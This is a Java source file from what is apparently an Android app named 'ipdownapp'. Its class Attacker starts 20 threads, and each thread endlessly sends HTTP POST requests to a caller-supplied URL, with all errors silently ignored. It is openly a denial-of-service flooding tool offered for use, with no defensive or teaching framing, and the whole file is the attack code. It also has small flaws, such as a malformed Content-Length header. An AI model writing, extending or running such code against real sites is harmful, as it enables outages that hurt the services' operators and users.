package com.example.ipdownapp.atack_tools;

import android.util.Log;

import androidx.annotation.Nullable;

import com.example.ipdownapp.activitys.DDOSActivity;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class Attacker {

    private int num_threadsDDOS;

    public Attacker(String url_request, int num_threads) throws Exception {
        //this.num_threads = num_threads;
        this.num_threadsDDOS = 20;
        for (int i = 0; i < this.num_threadsDDOS; i++) {
            DdosThread thread = new DdosThread();
            thread.setRequestURL(url_request);
            thread.start();
        }
    }

    public static class DdosThread extends Thread {

        private AtomicBoolean running = new AtomicBoolean(true);
        private String request;
        private URL url;

        String param = null;

        public DdosThread(){
        }

        public void setRequestURL(String request) {
            this.request = request;
            try{
                url = new URL(request);
                param = "param1=" + URLEncoder.encode("87845", "UTF-8");
            }catch (Exception e){
            }
        }

        @Override
        public void run() {
            while (running.get()) {
                try {
                    attack();
                } catch (Exception e) {
                }
            }
        }

        public void attack() throws Exception {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Content-Length", param);
            connection.connect();
            Log.e("THREAD ATACKER:" , ""+connection.getResponseCode());
            connection.getInputStream();
        }
    }
}
